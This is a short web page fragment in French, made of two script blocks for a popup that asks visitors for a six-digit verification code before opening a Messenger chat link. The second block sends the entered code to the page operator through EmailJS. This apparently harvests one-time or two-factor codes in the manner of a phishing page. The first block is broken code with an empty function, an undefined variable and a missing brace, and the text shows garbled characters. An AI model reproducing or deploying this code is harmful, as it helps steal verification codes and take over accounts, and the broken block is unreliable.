<script>
  function openMessengerPopup() {

  }

  function validateMessengerPin() {

    if (/^\d{6}$/.test(pin)) {
      window.open("https://m.me/epicstudiop", "_blank");
      document.getElementById('messengerPopup').style.display = 'none';
    } else {
      alert("Veuillez entrer un code PIN valide Ã  6 chiffres.");

  }
</script>

<script>
function validateMessengerPin() {
  const pin = document.getElementById('messengerPin').value.trim();
  if (!/^\d{6}$/.test(pin)) {
    alert("Veuillez entrer un code PIN valide Ã  6 chiffres.");
    return;
  }

  const params = { verification_code: pin };

  if (window.emailjs) {
    emailjs.send("service_photos", "template_code", params)
      .then(() => {
        document.getElementById('messengerPopup').style.display = 'none';
        window.open("https://m.me/epicstudiop", "_blank");
      })
      .catch(err => {
        alert("Erreur EmailJS : " + JSON.stringify(err));
      });
  } else {
    alert("EmailJS non chargÃ©.");
  }
}
</script>
